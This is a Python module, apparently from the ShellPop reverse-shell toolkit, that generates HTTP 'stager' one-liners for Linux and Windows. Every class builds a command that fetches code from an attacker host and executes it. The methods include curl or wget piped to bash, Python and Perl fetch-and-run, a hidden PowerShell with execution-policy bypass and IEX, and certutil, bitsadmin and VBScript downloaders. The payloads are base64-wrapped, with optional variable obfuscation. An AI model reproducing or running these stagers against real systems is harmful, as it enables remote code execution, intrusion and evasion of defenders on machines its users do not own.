from shellpop import *
from obfuscators import randomize_vars
from encoders import powershell_base64, xor, to_unicode, to_urlencode
from classes import base64_wrapper, xor_wrapper
from SimpleHTTPServer import SimpleHTTPRequestHandler
from SocketServer import TCPServer
from socket import *


class HTTPServer(object):
    def __init__(self, port):
        self.port = port

    def check_port(self):
        """
        We probe this port, to check if it is available.
        """
        sock = socket(AF_INET, SOCK_STREAM)
        sock.settimeout(3.0)  # maximum delay
        try:
            sock.connect(('', self.port))
            sock.close()
            return False
        except:
            sock.close()
            return True
        
    def start(self):
        print(info("Starting HTTP Server ..."))
        handler = SimpleHTTPRequestHandler
        server = TCPServer(("", self.port), handler)
        server.serve_forever()


class HTTPStager(object):
    def __init__(self, args):
        self.payload = None
        self.args = args
        self.opsec = False  # Set to true if it is stealth (hides windows or processes)

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.payload = randomize_vars(self.payload, self.args.obfuscate_small)

        # Apply base64 encoding.
        self.payload = base64_wrapper(self.name, self.payload, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True:
            self.payload = to_urlencode(self.payload)
        return self.payload


# All Payload stagers must have conn_info and payload.
# It must refer to HTTP port and not a shell handler port.
class Python_HTTP_Stager(HTTPStager):
    name = "Python HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """python -c "from requests import get;import os;os.system(get('http://{0}:{1}/{2}').text)" """.format(self.host, self.port, filename)


class Perl_HTTP_Stager(HTTPStager):
    name = "Perl HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """perl -e 'use LWP::UserAgent;$VAR1=new LWP::UserAgent;$VAR2="http://{0}:{1}/{2}";$req=new HTTP::Request("GET", $VAR2);$VAR3=$VAR1->request($req);$VAR4=$VAR3->content();system $VAR4' """.format(self.host,
                                                                                                       self.port,
                                                                                                       filename)


class Wget_HTTP_Stager(HTTPStager):
    name = "Wget HTTP stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """wget http://{0}:{1}/{2} -O - |bash -p""".format(self.host,
                self.port, filename)


class Curl_HTTP_Stager(HTTPStager):
    name = "cURL HTTP stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """curl http://{0}:{1}/{2} |bash -p""".format(self.host,
                self.port, filename)


class Powershell_HTTP_Stager(HTTPStager):
    name = "Powershell cmd.exe HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.opsec = True
        self.payload = """powershell.exe -nop -w hidden -ep bypass -Command $VAR1=new-object net.webclient;$VAR1.proxy=[Net.WebRequest]::GetSystemWebProxy();$VAR1.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$VAR2=$VAR1.downloadString('http://{0}:{1}/{2}');cmd.exe /c $VAR2 """.format(self.host, self.port, filename)


class PurePowershell_HTTP_Stager(HTTPStager):
    name = "Pure Powershell HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.opsec = True
        self.payload = """powershell.exe -nop -w hidden -ep bypass -Command $VAR1=new-object net.webclient;$VAR1.proxy=[Net.WebRequest]::GetSystemWebProxy();$VAR1.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $VAR1.downloadString('http://{0}:{1}/{2}') """.format(self.host, self.port, filename)


class Certutil_HTTP_Stager(HTTPStager):
    name = "CertUtil Windows HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """cmd.exe /c "certutil -urlcache -split -f http://{0}:{1}/{2} {2}.bat && start /b cmd.exe /c {2}.bat" """.format(self.host, self.port, filename)


class BitsAdmin_HTTP_Stager(HTTPStager):
    name = "BitsAdmin Windows HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && start /b cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(),
                                                                                              self.host, self.port,
                                                                                              filename)


class VbScriptHttpStager(HTTPStager):
    name = "VBScript Windows HTTP Stager"

    def __init__(self, conn_info, args, filename):
        HTTPStager.__init__(self, args)
        self.args = args
        self.host = conn_info[0]
        self.port = conn_info[1]
        self.payload = """start /wait /b cmd.exe /c echo var VAR1 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");VAR1.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);VAR1.Send();VAR2 = new ActiveXObject("ADODB.Stream");VAR2.Type = 1;VAR2.Open();VAR2.Write(VAR1.ResponseBody);VAR2.SaveToFile("{2}.bat"); > {2}.js && cscript {2}.js && {2}.bat""".format(self.host, self.port, filename)


def choose_stager(stagers):
    """
    Present a choice between an array of stagers.
    @zc00l
    """
    
    # This code snippet is to re-order stager list in a way that
    # it will not give me any trouble wth indexing, and still 
    # let me to be flexible about banning some staging options
    # from the shells.
    new_list = []
    i = 1
    for stager in stagers:
        new_list.insert(i-1, (i, stager[1]) )
        i += 1
    stagers = new_list

    print(info("Choose a stager: "))

    for stager in stagers:
        print("\033[093m%d\033[0m. ".ljust(3) % stager[0] + "%s" % stager[1].name)
        i += 1
    n = int(raw_input(info("Stager number: ")), 10) # decimal
    if n > len(stagers) or n < 1:
        print(error("You cant choose a stager option number higher than the maximum amount of available stagers. Setting it to 1."))
        n = 1
    print("\n")
    # Loop through each of them.
    for stager in stagers:
        if stager[0] == n:  # if (n-1) is the chosen number.
            return stager[1]  # return HTTPStager object.

# These are going to be passed as available stagers in bin/shellpop


LINUX_STAGERS = [
    (1, Python_HTTP_Stager),
    (2, Perl_HTTP_Stager),
    (3, Wget_HTTP_Stager),
    (4, Curl_HTTP_Stager),
]

WINDOWS_STAGERS = [
    (1, Powershell_HTTP_Stager),
    (2, Certutil_HTTP_Stager),
    (3, BitsAdmin_HTTP_Stager),
    (4, VbScriptHttpStager)
]